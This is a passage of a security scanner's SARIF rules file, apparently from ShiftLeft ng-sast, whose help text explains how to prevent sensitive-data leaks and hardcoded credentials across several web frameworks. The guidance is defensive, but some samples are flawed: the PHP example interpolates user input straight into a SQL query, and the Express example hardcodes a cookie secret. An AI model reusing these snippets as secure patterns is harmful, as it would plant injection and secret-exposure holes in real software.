                            "help": {
                                "markdown": "Sensitive data is logged in this flow.\n\n# Sensitive Data Leaks\n\nDisclosing system information helps an adversary learn about your web application and form a plan of attack. You should\ntry to reveal as little about your technology stack and architecture as possible, beyond what is essential for your\nusers to know. Revealing system information makes life easier for an attacker, and gives them a playbook of\nvulnerabilities they can probe for.\n\nHere are some common ways websites leak sensitive data:\n\n* Error conditions that display stack traces or database error messages to the user.\n* Open directory listings that allow exploration of the server's file system.\n* Unsanitized comments in HTML and template files the reveal system details.\n\n::::tabs\n\n:::tab[Java]\n\n## How to Prevent Data Leaks in Java\n\n### Keep Error Reporting on the Server\n\nDisable client-side error reporting in your production environment, by specifying an error page in your `web.xml` file:\n\n```xml\n<error-page>\n  <location>/error.html</location>\n</error-page>\n```\n  \nThis error page should only contain a generic error message (e.g. \"An error occurred\"). Stack traces should be written\nto server-side logs.\n\n### Sanitize Error Messages\n\nMake sure error messages returned from the database or containing system information are logged, but not shown to the\nuser. Here a generic error message is shown to the user, while the detailed error is written to the logs for investigation:\n\n```java\ntry \n{\n    user = getDatabase().findUser(email);\n}\ncatch (SQLException ex) \n{\n    log.error(\"An error occurred looking up the user profiles\", ex):\n    throw new ClientFacingException(\"An unexpected error occurred, please try again later.\");\n}\n```\n\n### Separate Dynamic and Static Resources\n\nEnsure static resources and dynamic content are stored in separate directories, so a malicious user cannot snoop \nthrough your code and configuration files. For example, this is how to tell Java to server static Javascript files\nfrom the `/js` directory:\n  \n```xml\n<servlet-mapping>\n    <servlet-name>default</servlet-name>\n    <url-pattern>/js/*.js</url-pattern>\n</servlet-mapping>\n```\n\n### Disable the \"Server\" Header \n\nConsider disabling the `Server` header and the (non-standard but common) `X-Powered-By` header, and making the session \ncookie name generic. This will give your keep an attacker guessing about what your technology stack is, which makes \nattacking it harder. Here's how to do that in the Jetty web-server:\n  \n```java\nHttpConfiguration.setSendServerVersion(false);\n```\n\n:::\n\n:::tab[C#]\n\n## How to Prevent Data Leaks in C#\n\n### Keep Error Reporting on the Server\n\nDisable client-side error reporting in your production environment. When you create a new ASP.NET application, the \ntemplate will generate a startup class with some configuration logic:\n\n```csharp\n    public void Configure(IApplicationBuilder app, IWebHostEnvironment env)\n    {\n        if (env.IsDevelopment())\n        {\n            app.UseDeveloperExceptionPage();\n        }\n        else\n        {\n            app.UseExceptionHandler(\"/Home/Error\");\n        }\n    }\n```\n\nThe default error page only contain a generic error message (e.g. \"An error occurred\"), whereas the development-mode\nerror page will log full stack traces.\n\n### Sanitize Error Messages\n\nMake sure error messages returned from the database or containing system information are logged, but not shown to the \nuser. When running in non-development mode the ASP.NET web-server will show a generic error message to the user, while \nthe detailed error is written to the logs for investigation. You can configure the error page that is generated at\n`/Views/Shared/Errors.cs.html`.\n\n### Separate Dynamic and Static Resources\n\nEnsure static resources and dynamic content are stored in separate directories, so a malicious user cannot snoop \nthrough your code and configuration files. An ASP.NET web application can be configured to serve static content under\nthe `wwwroot` directory by adding the following line in the startup configuration:\n\n```csharp\napp.UseStaticFiles();\n```\n\nYou can also add additional static content directories with the following logic:\n\n```csharp\napp.UseStaticFiles(new StaticFileOptions\n{\n    FileProvider = new PhysicalFileProvider(Path.Combine(env.ContentRootPath, \"MyStaticFiles\")),\n    RequestPath = \"/StaticFiles\"\n});\n```\n\n### Disable the \"Server\" Header \n\nConsider disabling the `Server` header and the (non-standard but common) `X-Powered-By` header, and making the session \ncookie name generic. This will give your keep an attacker guessing about what your technology stack is, which makes \nattacking it harder. In ASP.NET, you can programmatically remove it in the following manner:\n\n```csharp\nHttpContext.Current.Response.Headers.Remove(\"Server\");\n```\n\nIf you are deploying to IIS, you can remove the header in your configuration settings:\n\n```xml\n<?xml version=\"1.0\" encoding=\"UTF-8\"?>\n<configuration>\n    <system.webServer>\n        <security>\n            <requestFiltering removeServerHeader=\"true\" />\n        </security>\n    </system.webServer>\n</configuration>\n```\n\n:::\n\n:::tab[JavaScript]\n\n## How to Prevent Data Leaks in JavaScript\n\n### Keep Error Reporting on the Server\n\nDisable client-side error reporting in your production environment. This Express server will dump stack trace \ninformation only in the `development` environment, and disable it in `production`:\n  \n```javascript\nconst errorhandler = require('errorhandler')\nconst express      = require('express')\n\nconst app = express()\n\napp.use(errorhandler({\n  dumpExceptions : app.get('env') === 'development',\n  showStack      : app.get('env') === 'development'\n}))\n```\n\n### Sanitize Error Messages\n\nMake sure error messages returned from the database are logged, but not shown to the user. Here a generic error \nmessage is shown to the user, while the detailed error is written to the logs for investigation:\n\n```javascript\napp.get('/profile', (request, response) => {\n  db.run('SELECT * FROM USERS WHERE email = ?', [ request.session.user ], (error, user) => {\n    if (error) {\n      log.error(error)\n      response.send('An unexpected error occurred')\n      return\n    }\n\n    response.send(`<p>Your email is ${user.email}</p>`)\n  })\n})\n```\n\n### Separate Dynamic and Static Resources\n\nEnsure static resources and dynamic content are stored in separate directories, so a malicious user cannot snoop \nthrough your code and configuration files. For example, this is how to tell Expression to server static content (like \nclient-side JavaScript and CSS files) from the `/static` directory:\n  \n```javascript\napp.use(express.static(__dirname + '/static'))\n```\n\n### Disable the \"Server\" Header \n\nConsider disabling the `Server` header and the (non-standard but common) `X-Powered-By` header, and making the session \ncookie name generic. This will give your keep an attacker guessing about what your technology stack is, which makes \nattacking it harder. Here's how to do that in Express:\n  \n```javascript\n// Disable the 'X-Powered-By' header.\napp.disable('x-powered-by')\n\nconst cookieParser = require('cookie-parser')\nconst session      = require('express-session')\n\napp.use(cookieParser('secret'))\napp.use(session({\n  cookie : {\n    maxAge   : 60000,\n    httpOnly : true,\n    sameSite : 'strict',\n    secure   : app.get('env') !== 'development'\n  },\n\n  // Make the session cookie name generic.\n  name   : 'session',\n  secret : process.env.SESSION_SECRET || uid.sync(18)\n}))\n```\n\n:::\n\n:::tab[Python]\n\n## How to Prevent Data Leaks in Python\n\n### Keep Error Reporting on the Server\n\nDisable client-side error reporting in your production environment. Observe how the Flask framework uses different error\npages in development and production modes, distinguished by whether the environment variable `FLASK_ENV` is set to\n`development`:\n\n```python\n  @property\n  def debug(self) -> bool:\n     \"\"\"Whether debug mode is enabled. When using ``flask run`` to start\n     the development server, an interactive debugger will be shown for\n     unhandled exceptions, and the server will be reloaded when code\n     changes. This maps to the :data:`DEBUG` config key. This is\n     enabled when :attr:`env` is ``'development'`` and is overridden\n     by the ``FLASK_DEBUG`` environment variable. It may not behave as\n     expected if set in code.\n\n     **Do not enable debug mode when deploying in production.**\"\"\"\n     return self.config[\"DEBUG\"]\n```\n\nThe default error page only contain a generic error message (e.g. \"An error occurred\"), whereas the development-mode\nerror page will log full stack traces, and even allow interactive execution of Python code.\n\n### Sanitize Error Messages\n\nMake sure error messages returned from the database or containing system information are logged, but not shown to the \nuser. When running in non-development mode the Flask web-server will show a generic error message to the user, while \nthe detailed error is written to the logs for investigation:\n\n```python\n  def log_exception(self, exc_info) -> None:\n    \"\"\"Logs an exception.  This is called by :meth:`handle_exception`\n    if debugging is disabled and right before the handler is called.\n    The default implementation logs the exception as error on the\n    :attr:`logger`.\n    \"\"\"\n    self.logger.error(\n        f\"Exception on {request.path} [{request.method}]\", exc_info=exc_info\n    )\n```\n\n### Separate Dynamic and Static Resources\n\nEnsure static resources and dynamic content are stored in separate directories, so a malicious user cannot snoop \nthrough your code and configuration files. Here's how to specify the directory containing static files (like JavaScript \ncode and images) in the Flask web-server:\n\n```python\nfrom flask import Flask\n\napp = Flask(__name__, static_folder='static')\n```\n\n### Disable the \"Server\" Header \n\nConsider disabling the `Server` header and the (non-standard but common) `X-Powered-By` header, and making the session \ncookie name generic. This will give your keep an attacker guessing about what your technology stack is, which makes \nattacking it harder. In the Gunicorn WSGI container, you can configure this header in your `gunicorn.conf.py` config \nfile:\n\n```python\nimport gunicorn\n\n# Make the server name completely generic.\ngunicorn.SERVER_SOFTWARE = 'Server'\n```\n\n:::\n\n:::tab[Scala]\n\n## How to Prevent Data Leaks in Scala\n\n### Keep Error Reporting on the Server\n\nDisable client-side error reporting in your production environment. Notice how the Play framework uses different error\npages in development and production modes:\n\n```scala\n  /**\n   * Invoked in dev mode when a server error occurs.\n   */\n  protected def onDevServerError(request: RequestHeader, exception: UsefulException): Future[Result] = {\n    Future.successful {\n      implicit val ir: RequestHeader = request\n      InternalServerError(views.html.defaultpages.devError(playEditor, exception))\n    }\n  }\n\n  /**\n   * Invoked in prod mode when a server error occurs.\n   */\n  protected def onProdServerError(request: RequestHeader, exception: UsefulException): Future[Result] =\n    Future.successful {\n      implicit val ir: RequestHeader = request\n      InternalServerError(views.html.defaultpages.error(exception))\n    }\n```\n\nThe default error page only contain a generic error message (e.g. \"An error occurred\"), whereas the development-mode\nerror page will log full stack traces.\n\n### Sanitize Error Messages\n\nMake sure error messages returned from the database or containing system information are logged, but not shown to the \nuser. Here a generic error message is shown to the user, while the detailed error is written to the logs for investigation:\n\n```scala\n  override def onServerError(request: RequestHeader, exception: Throwable): Future[Result] = {\n    try {\n      val usefulException = HttpErrorHandlerExceptions.throwableToUsefulException(sourceMapper, !config.showDevErrors, exception)\n\n      // Write the full error context and stack trace to the log file.\n      logServerError(request, usefulException)\n\n      // Sanitize the error to be displayed to the user, when in production-mode.\n      if (config.showDevErrors) onDevServerError(request, usefulException)\n      else onProdServerError(request, usefulException)\n    } catch {\n      case NonFatal(e) =>\n        logger.error(\"Error while handling error\", e)\n        Future.successful(InternalServerError(fatalErrorMessage(request, e)))\n    }\n  }\n```\n\n### Separate Dynamic and Static Resources\n\nEnsure static resources and dynamic content are stored in separate directories, so a malicious user cannot snoop \nthrough your code and configuration files. In the Play framework, static assets like JavaScript and CSS files are \ntypically kept in a separate `/public` and mapped in the routes file as follows:\n\n```scala\nGET  /assets/*file        controllers.Assets.at(path=\"/public\", file)\n```\n\n### Disable the \"Server\" Header \n\nConsider disabling the `Server` header and the (non-standard but common) `X-Powered-By` header, and making the session \ncookie name generic. This will give your keep an attacker guessing about what your technology stack is, which makes \nattacking it harder. For example, the Akka web-server allows you to disable these headers through configuration options:\n\n```\nakka.http {\n  server {\n    # The default value of the `Server` header to produce if no\n    # explicit `Server`-header was included in a response.\n    # If this value is the empty string and no header was included in\n    # the request, no `Server` header will be rendered at all.\n    server-header = \"\" # akka-http/${akka.http.version}\n  }  \n}\n```\n\n:::\n\n:::tab[Go]\n\n## How to Prevent Data Leaks in Go\n\n### Keep Error Reporting on the Server\n\nDisable client-side error reporting in your production environment. In Go web applications, you typically end up writing\nyour own error pages. Ensure that any pages that handle errors pay use flags to distinguish the environment they are \nexecuting in:\n\n```go\nimport \"flag\"\n\nvar debug = flag.Bool(\"debug\", false, \"Whether to show full error messages on the client\")\n```\n\nA default error page only contain a generic error message (e.g. \"An error occurred\"), whereas the development-mode\nerror page can show more information, like full stack traces.\n\n### Sanitize Error Messages\n\nMake sure error messages returned from the database or containing system information are logged, but not shown to the \nuser. Go functions typically return error codes when then fail, and web handlers will return early when error conditions \noccur. Ensure such code does not leak sensitive system data.\n\n```go\nsession, err := session.Get(request, \"session\")\n\nif err != nil {\n  // The second argument here is returned directly to the client, which leaks information!\n  http.Error(response, err.Error(), http.StatusInternalServerError)\n  return\n}\n```\n\n### Separate Dynamic and Static Resources\n\nEnsure static resources and dynamic content are stored in separate directories, so a malicious user cannot snoop \nthrough your code and configuration files. Here's how to specify the directory containing static files (like JavaScript \ncode and images) in the Gorilla web framework:\n\n```go\nfunc main() {\n  var dir string\n\n  flag.StringVar(&dir, \"dir\", \".\", \"the directory to serve files from. Defaults to the current dir\")\n  flag.Parse()\n  router := mux.NewRouter()\n\n  // This will serve files under http://localhost:8000/static/<filename>\n  router.PathPrefix(\"/static/\").Handler(http.StripPrefix(\"/static/\", http.FileServer(http.Dir(dir))))\n\n  server := &http.Server{\n    Handler: router,\n    Addr:    \"127.0.0.1:8000\"\n  }\n\n  log.Fatal(server.ListenAndServe())\n}\n```\n\n:::\n\n:::tab[PHP]\n\n## How to Prevent Data Leaks in PHP\n\n### Keep Error Reporting on the Server\n\nDisable error reporting to the client in your production environment by setting the `display_errors` directive to `Off` in your `php.ini`:\n\n```ini\ndisplay_errors = Off\n```\n\nYou should instead log the errors for review. Ensure that `log_errors` directive is set to `On`:\n\n```ini\nlog_errors = On\nerror_log = /path/to/php-error.log\n```\n\n### Sanitize Error Messages\n\nAvoid directly echoing out database or system error messages to the user. Instead, present a generic message while logging the exact error for debugging:\n\n```php\ntry \n{\n    $result = $db->query(\"SELECT * FROM users WHERE email = '$email'\");\n}\ncatch (PDOException $e) \n{\n    error_log(\"Database error: \" . $e->getMessage());\n    echo \"An unexpected error occurred, please try again later.\";\n}\n```\n\n### Separate Dynamic and Static Resources\n\nFor websites or web applications using PHP, it's common to store PHP files in one directory and static resources (e.g., images, stylesheets, and JavaScript files) in separate directories. This way, you can use server configurations to ensure direct access to PHP files is restricted.\n\n### Hide PHP Version Information\n\nThe `X-Powered-By` header can give away the PHP version you're running. To hide this:\n\n1. Edit `php.ini` and update:\n\n```ini\nexpose_php = Off\n```\n\nOr, if you're using an `.htaccess` file on an Apache server:\n\n```apache\nHeader unset X-Powered-By\n```\n\n### Be Careful With Comments\n\nAvoid leaving sensitive or internal-only comments in your PHP files. Even if you think they are in a part of the code that doesn't output to the user, mistakes or changes in the codebase could expose them. Always assume that anything in a code file could potentially be exposed.\n\n:::\n\n::::\n\n## Further Considerations\n\n* Ensure any comments in template files don't contain sensitive data! It's easy to leave in notes about server names\n  and addresses that will get passed to the client-side. Attackers know this, and will scan comments in HTML for IP\n  addresses and URLs.\n  \n* Ensure server-side log messages do not contain sensitive information like passwords or credit card numbers - this \n  should mitigate the harm an attacker can do if they manage to steal your server's log files.\n  \n\n## Additional information\n\n**[CWE-200](https://cwe.mitre.org/data/definitions/200.html)**\n\n**[OWASP-A3](https://owasp.org/www-project-top-ten/OWASP_Top_Ten_2017/Top_10-2017_A3-Sensitive_Data_Exposure)**",
                                "text": "Sensitive data is logged in this flow.\n\n# Sensitive Data Leaks\n\nDisclosing system information helps an adversary learn about your web application and form a plan of attack. You should\ntry to reveal as little about your technology stack and architecture as possible, beyond what is essential for your\nusers to know. Revealing system information makes life easier for an attacker, and gives them a playbook of\nvulnerabilities they can probe for.\n\nHere are some common ways websites leak sensitive data:\n\n* Error conditions that display stack traces or database error messages to the user.\n* Open directory listings that allow exploration of the server's file system.\n* Unsanitized comments in HTML and template files the reveal system details.\n\n::::tabs\n\n:::tab[Java]\n\n## How to Prevent Data Leaks in Java\n\n### Keep Error Reporting on the Server\n\nDisable client-side error reporting in your production environment, by specifying an error page in your `web.xml` file:\n\n```xml\n<error-page>\n  <location>/error.html</location>\n</error-page>\n```\n  \nThis error page should only contain a generic error message (e.g. \"An error occurred\"). Stack traces should be written\nto server-side logs.\n\n### Sanitize Error Messages\n\nMake sure error messages returned from the database or containing system information are logged, but not shown to the\nuser. Here a generic error message is shown to the user, while the detailed error is written to the logs for investigation:\n\n```java\ntry \n{\n    user = getDatabase().findUser(email);\n}\ncatch (SQLException ex) \n{\n    log.error(\"An error occurred looking up the user profiles\", ex):\n    throw new ClientFacingException(\"An unexpected error occurred, please try again later.\");\n}\n```\n\n### Separate Dynamic and Static Resources\n\nEnsure static resources and dynamic content are stored in separate directories, so a malicious user cannot snoop \nthrough your code and configuration files. For example, this is how to tell Java to server static Javascript files\nfrom the `/js` directory:\n  \n```xml\n<servlet-mapping>\n    <servlet-name>default</servlet-name>\n    <url-pattern>/js/*.js</url-pattern>\n</servlet-mapping>\n```\n\n### Disable the \"Server\" Header \n\nConsider disabling the `Server` header and the (non-standard but common) `X-Powered-By` header, and making the session \ncookie name generic. This will give your keep an attacker guessing about what your technology stack is, which makes \nattacking it harder. Here's how to do that in the Jetty web-server:\n  \n```java\nHttpConfiguration.setSendServerVersion(false);\n```\n\n:::\n\n:::tab[C#]\n\n## How to Prevent Data Leaks in C#\n\n### Keep Error Reporting on the Server\n\nDisable client-side error reporting in your production environment. When you create a new ASP.NET application, the \ntemplate will generate a startup class with some configuration logic:\n\n```csharp\n    public void Configure(IApplicationBuilder app, IWebHostEnvironment env)\n    {\n        if (env.IsDevelopment())\n        {\n            app.UseDeveloperExceptionPage();\n        }\n        else\n        {\n            app.UseExceptionHandler(\"/Home/Error\");\n        }\n    }\n```\n\nThe default error page only contain a generic error message (e.g. \"An error occurred\"), whereas the development-mode\nerror page will log full stack traces.\n\n### Sanitize Error Messages\n\nMake sure error messages returned from the database or containing system information are logged, but not shown to the \nuser. When running in non-development mode the ASP.NET web-server will show a generic error message to the user, while \nthe detailed error is written to the logs for investigation. You can configure the error page that is generated at\n`/Views/Shared/Errors.cs.html`.\n\n### Separate Dynamic and Static Resources\n\nEnsure static resources and dynamic content are stored in separate directories, so a malicious user cannot snoop \nthrough your code and configuration files. An ASP.NET web application can be configured to serve static content under\nthe `wwwroot` directory by adding the following line in the startup configuration:\n\n```csharp\napp.UseStaticFiles();\n```\n\nYou can also add additional static content directories with the following logic:\n\n```csharp\napp.UseStaticFiles(new StaticFileOptions\n{\n    FileProvider = new PhysicalFileProvider(Path.Combine(env.ContentRootPath, \"MyStaticFiles\")),\n    RequestPath = \"/StaticFiles\"\n});\n```\n\n### Disable the \"Server\" Header \n\nConsider disabling the `Server` header and the (non-standard but common) `X-Powered-By` header, and making the session \ncookie name generic. This will give your keep an attacker guessing about what your technology stack is, which makes \nattacking it harder. In ASP.NET, you can programmatically remove it in the following manner:\n\n```csharp\nHttpContext.Current.Response.Headers.Remove(\"Server\");\n```\n\nIf you are deploying to IIS, you can remove the header in your configuration settings:\n\n```xml\n<?xml version=\"1.0\" encoding=\"UTF-8\"?>\n<configuration>\n    <system.webServer>\n        <security>\n            <requestFiltering removeServerHeader=\"true\" />\n        </security>\n    </system.webServer>\n</configuration>\n```\n\n:::\n\n:::tab[JavaScript]\n\n## How to Prevent Data Leaks in JavaScript\n\n### Keep Error Reporting on the Server\n\nDisable client-side error reporting in your production environment. This Express server will dump stack trace \ninformation only in the `development` environment, and disable it in `production`:\n  \n```javascript\nconst errorhandler = require('errorhandler')\nconst express      = require('express')\n\nconst app = express()\n\napp.use(errorhandler({\n  dumpExceptions : app.get('env') === 'development',\n  showStack      : app.get('env') === 'development'\n}))\n```\n\n### Sanitize Error Messages\n\nMake sure error messages returned from the database are logged, but not shown to the user. Here a generic error \nmessage is shown to the user, while the detailed error is written to the logs for investigation:\n\n```javascript\napp.get('/profile', (request, response) => {\n  db.run('SELECT * FROM USERS WHERE email = ?', [ request.session.user ], (error, user) => {\n    if (error) {\n      log.error(error)\n      response.send('An unexpected error occurred')\n      return\n    }\n\n    response.send(`<p>Your email is ${user.email}</p>`)\n  })\n})\n```\n\n### Separate Dynamic and Static Resources\n\nEnsure static resources and dynamic content are stored in separate directories, so a malicious user cannot snoop \nthrough your code and configuration files. For example, this is how to tell Expression to server static content (like \nclient-side JavaScript and CSS files) from the `/static` directory:\n  \n```javascript\napp.use(express.static(__dirname + '/static'))\n```\n\n### Disable the \"Server\" Header \n\nConsider disabling the `Server` header and the (non-standard but common) `X-Powered-By` header, and making the session \ncookie name generic. This will give your keep an attacker guessing about what your technology stack is, which makes \nattacking it harder. Here's how to do that in Express:\n  \n```javascript\n// Disable the 'X-Powered-By' header.\napp.disable('x-powered-by')\n\nconst cookieParser = require('cookie-parser')\nconst session      = require('express-session')\n\napp.use(cookieParser('secret'))\napp.use(session({\n  cookie : {\n    maxAge   : 60000,\n    httpOnly : true,\n    sameSite : 'strict',\n    secure   : app.get('env') !== 'development'\n  },\n\n  // Make the session cookie name generic.\n  name   : 'session',\n  secret : process.env.SESSION_SECRET || uid.sync(18)\n}))\n```\n\n:::\n\n:::tab[Python]\n\n## How to Prevent Data Leaks in Python\n\n### Keep Error Reporting on the Server\n\nDisable client-side error reporting in your production environment. Observe how the Flask framework uses different error\npages in development and production modes, distinguished by whether the environment variable `FLASK_ENV` is set to\n`development`:\n\n```python\n  @property\n  def debug(self) -> bool:\n     \"\"\"Whether debug mode is enabled. When using ``flask run`` to start\n     the development server, an interactive debugger will be shown for\n     unhandled exceptions, and the server will be reloaded when code\n     changes. This maps to the :data:`DEBUG` config key. This is\n     enabled when :attr:`env` is ``'development'`` and is overridden\n     by the ``FLASK_DEBUG`` environment variable. It may not behave as\n     expected if set in code.\n\n     **Do not enable debug mode when deploying in production.**\"\"\"\n     return self.config[\"DEBUG\"]\n```\n\nThe default error page only contain a generic error message (e.g. \"An error occurred\"), whereas the development-mode\nerror page will log full stack traces, and even allow interactive execution of Python code.\n\n### Sanitize Error Messages\n\nMake sure error messages returned from the database or containing system information are logged, but not shown to the \nuser. When running in non-development mode the Flask web-server will show a generic error message to the user, while \nthe detailed error is written to the logs for investigation:\n\n```python\n  def log_exception(self, exc_info) -> None:\n    \"\"\"Logs an exception.  This is called by :meth:`handle_exception`\n    if debugging is disabled and right before the handler is called.\n    The default implementation logs the exception as error on the\n    :attr:`logger`.\n    \"\"\"\n    self.logger.error(\n        f\"Exception on {request.path} [{request.method}]\", exc_info=exc_info\n    )\n```\n\n### Separate Dynamic and Static Resources\n\nEnsure static resources and dynamic content are stored in separate directories, so a malicious user cannot snoop \nthrough your code and configuration files. Here's how to specify the directory containing static files (like JavaScript \ncode and images) in the Flask web-server:\n\n```python\nfrom flask import Flask\n\napp = Flask(__name__, static_folder='static')\n```\n\n### Disable the \"Server\" Header \n\nConsider disabling the `Server` header and the (non-standard but common) `X-Powered-By` header, and making the session \ncookie name generic. This will give your keep an attacker guessing about what your technology stack is, which makes \nattacking it harder. In the Gunicorn WSGI container, you can configure this header in your `gunicorn.conf.py` config \nfile:\n\n```python\nimport gunicorn\n\n# Make the server name completely generic.\ngunicorn.SERVER_SOFTWARE = 'Server'\n```\n\n:::\n\n:::tab[Scala]\n\n## How to Prevent Data Leaks in Scala\n\n### Keep Error Reporting on the Server\n\nDisable client-side error reporting in your production environment. Notice how the Play framework uses different error\npages in development and production modes:\n\n```scala\n  /**\n   * Invoked in dev mode when a server error occurs.\n   */\n  protected def onDevServerError(request: RequestHeader, exception: UsefulException): Future[Result] = {\n    Future.successful {\n      implicit val ir: RequestHeader = request\n      InternalServerError(views.html.defaultpages.devError(playEditor, exception))\n    }\n  }\n\n  /**\n   * Invoked in prod mode when a server error occurs.\n   */\n  protected def onProdServerError(request: RequestHeader, exception: UsefulException): Future[Result] =\n    Future.successful {\n      implicit val ir: RequestHeader = request\n      InternalServerError(views.html.defaultpages.error(exception))\n    }\n```\n\nThe default error page only contain a generic error message (e.g. \"An error occurred\"), whereas the development-mode\nerror page will log full stack traces.\n\n### Sanitize Error Messages\n\nMake sure error messages returned from the database or containing system information are logged, but not shown to the \nuser. Here a generic error message is shown to the user, while the detailed error is written to the logs for investigation:\n\n```scala\n  override def onServerError(request: RequestHeader, exception: Throwable): Future[Result] = {\n    try {\n      val usefulException = HttpErrorHandlerExceptions.throwableToUsefulException(sourceMapper, !config.showDevErrors, exception)\n\n      // Write the full error context and stack trace to the log file.\n      logServerError(request, usefulException)\n\n      // Sanitize the error to be displayed to the user, when in production-mode.\n      if (config.showDevErrors) onDevServerError(request, usefulException)\n      else onProdServerError(request, usefulException)\n    } catch {\n      case NonFatal(e) =>\n        logger.error(\"Error while handling error\", e)\n        Future.successful(InternalServerError(fatalErrorMessage(request, e)))\n    }\n  }\n```\n\n### Separate Dynamic and Static Resources\n\nEnsure static resources and dynamic content are stored in separate directories, so a malicious user cannot snoop \nthrough your code and configuration files. In the Play framework, static assets like JavaScript and CSS files are \ntypically kept in a separate `/public` and mapped in the routes file as follows:\n\n```scala\nGET  /assets/*file        controllers.Assets.at(path=\"/public\", file)\n```\n\n### Disable the \"Server\" Header \n\nConsider disabling the `Server` header and the (non-standard but common) `X-Powered-By` header, and making the session \ncookie name generic. This will give your keep an attacker guessing about what your technology stack is, which makes \nattacking it harder. For example, the Akka web-server allows you to disable these headers through configuration options:\n\n```\nakka.http {\n  server {\n    # The default value of the `Server` header to produce if no\n    # explicit `Server`-header was included in a response.\n    # If this value is the empty string and no header was included in\n    # the request, no `Server` header will be rendered at all.\n    server-header = \"\" # akka-http/${akka.http.version}\n  }  \n}\n```\n\n:::\n\n:::tab[Go]\n\n## How to Prevent Data Leaks in Go\n\n### Keep Error Reporting on the Server\n\nDisable client-side error reporting in your production environment. In Go web applications, you typically end up writing\nyour own error pages. Ensure that any pages that handle errors pay use flags to distinguish the environment they are \nexecuting in:\n\n```go\nimport \"flag\"\n\nvar debug = flag.Bool(\"debug\", false, \"Whether to show full error messages on the client\")\n```\n\nA default error page only contain a generic error message (e.g. \"An error occurred\"), whereas the development-mode\nerror page can show more information, like full stack traces.\n\n### Sanitize Error Messages\n\nMake sure error messages returned from the database or containing system information are logged, but not shown to the \nuser. Go functions typically return error codes when then fail, and web handlers will return early when error conditions \noccur. Ensure such code does not leak sensitive system data.\n\n```go\nsession, err := session.Get(request, \"session\")\n\nif err != nil {\n  // The second argument here is returned directly to the client, which leaks information!\n  http.Error(response, err.Error(), http.StatusInternalServerError)\n  return\n}\n```\n\n### Separate Dynamic and Static Resources\n\nEnsure static resources and dynamic content are stored in separate directories, so a malicious user cannot snoop \nthrough your code and configuration files. Here's how to specify the directory containing static files (like JavaScript \ncode and images) in the Gorilla web framework:\n\n```go\nfunc main() {\n  var dir string\n\n  flag.StringVar(&dir, \"dir\", \".\", \"the directory to serve files from. Defaults to the current dir\")\n  flag.Parse()\n  router := mux.NewRouter()\n\n  // This will serve files under http://localhost:8000/static/<filename>\n  router.PathPrefix(\"/static/\").Handler(http.StripPrefix(\"/static/\", http.FileServer(http.Dir(dir))))\n\n  server := &http.Server{\n    Handler: router,\n    Addr:    \"127.0.0.1:8000\"\n  }\n\n  log.Fatal(server.ListenAndServe())\n}\n```\n\n:::\n\n:::tab[PHP]\n\n## How to Prevent Data Leaks in PHP\n\n### Keep Error Reporting on the Server\n\nDisable error reporting to the client in your production environment by setting the `display_errors` directive to `Off` in your `php.ini`:\n\n```ini\ndisplay_errors = Off\n```\n\nYou should instead log the errors for review. Ensure that `log_errors` directive is set to `On`:\n\n```ini\nlog_errors = On\nerror_log = /path/to/php-error.log\n```\n\n### Sanitize Error Messages\n\nAvoid directly echoing out database or system error messages to the user. Instead, present a generic message while logging the exact error for debugging:\n\n```php\ntry \n{\n    $result = $db->query(\"SELECT * FROM users WHERE email = '$email'\");\n}\ncatch (PDOException $e) \n{\n    error_log(\"Database error: \" . $e->getMessage());\n    echo \"An unexpected error occurred, please try again later.\";\n}\n```\n\n### Separate Dynamic and Static Resources\n\nFor websites or web applications using PHP, it's common to store PHP files in one directory and static resources (e.g., images, stylesheets, and JavaScript files) in separate directories. This way, you can use server configurations to ensure direct access to PHP files is restricted.\n\n### Hide PHP Version Information\n\nThe `X-Powered-By` header can give away the PHP version you're running. To hide this:\n\n1. Edit `php.ini` and update:\n\n```ini\nexpose_php = Off\n```\n\nOr, if you're using an `.htaccess` file on an Apache server:\n\n```apache\nHeader unset X-Powered-By\n```\n\n### Be Careful With Comments\n\nAvoid leaving sensitive or internal-only comments in your PHP files. Even if you think they are in a part of the code that doesn't output to the user, mistakes or changes in the codebase could expose them. Always assume that anything in a code file could potentially be exposed.\n\n:::\n\n::::\n\n## Further Considerations\n\n* Ensure any comments in template files don't contain sensitive data! It's easy to leave in notes about server names\n  and addresses that will get passed to the client-side. Attackers know this, and will scan comments in HTML for IP\n  addresses and URLs.\n  \n* Ensure server-side log messages do not contain sensitive information like passwords or credit card numbers - this \n  should mitigate the harm an attacker can do if they manage to steal your server's log files.\n  \n\n## Additional information\n\n**[CWE-200](https://cwe.mitre.org/data/definitions/200.html)**\n\n**[OWASP-A3](https://owasp.org/www-project-top-ten/OWASP_Top_Ten_2017/Top_10-2017_A3-Sensitive_Data_Exposure)**"
                            },
                            "helpUri": "https://docs.shiftleft.io/ngsast/product-info/coverage#vulnerabilities",
                            "id": "Hex%20High%20Entropy%20String/605b39caf08ee35056cb037ff75f954a4484a74f7b500908995d36b97cff0a0d",
                            "name": "Hex High Entropy String",
                            "properties": {
                                "precision": "very-high",
                                "security-severity": "5.5",
                                "tags": [
                                    "ng-sast",
                                    "CVSS 5.5",
                                    "Generic Secret",
                                    "OWASP a3-sensitive-data-exposure"
                                ]
                            },
                            "shortDescription": {
                                "text": "Hex High Entropy String"
                            }
                        },
                        {
                            "defaultConfiguration": {
                                "enabled": true,
                                "level": "warning",
                                "rank": -1
                            },
                            "fullDescription": {
                                "text": "Credentials are hardcoded, allowing everyone with access to the source code or compilation."
                            },
                            "help": {
                                "markdown": "Credentials are hardcoded, allowing everyone with access to the source code or compilation\n artifacts to impersonate the application and access protected data or systems.\n ## Countermeasures\n - Retrieve credentials from a secured location only accessible from the production environment.\n ## Additional information\n **[CWE-259](https://cwe.mitre.org/data/definitions/259.html)**\n **[CWE-798](https://cwe.mitre.org/data/definitions/798.html)**\n **[OWASP-a3](https://owasp.org/www-project-top-ten/OWASP_Top_Ten_2017/Top_10-2017_a3-Sensitive_Data_Exposure)**",
                                "text": "Credentials are hardcoded, allowing everyone with access to the source code or compilation\n artifacts to impersonate the application and access protected data or systems.\n ## Countermeasures\n - Retrieve credentials from a secured location only accessible from the production environment.\n ## Additional information\n **[CWE-259](https://cwe.mitre.org/data/definitions/259.html)**\n **[CWE-798](https://cwe.mitre.org/data/definitions/798.html)**\n **[OWASP-a3](https://owasp.org/www-project-top-ten/OWASP_Top_Ten_2017/Top_10-2017_a3-Sensitive_Data_Exposure)**"
                            },
                            "helpUri": "https://docs.shiftleft.io/ngsast/product-info/coverage#vulnerabilities",
                            "id": "Secret%20Keyword/e6995b62bae3c24d9b0a768d08bf6cc3df19a93d164dd47cde4e87529f284249",
                            "name": "Secret Keyword",
                            "properties": {
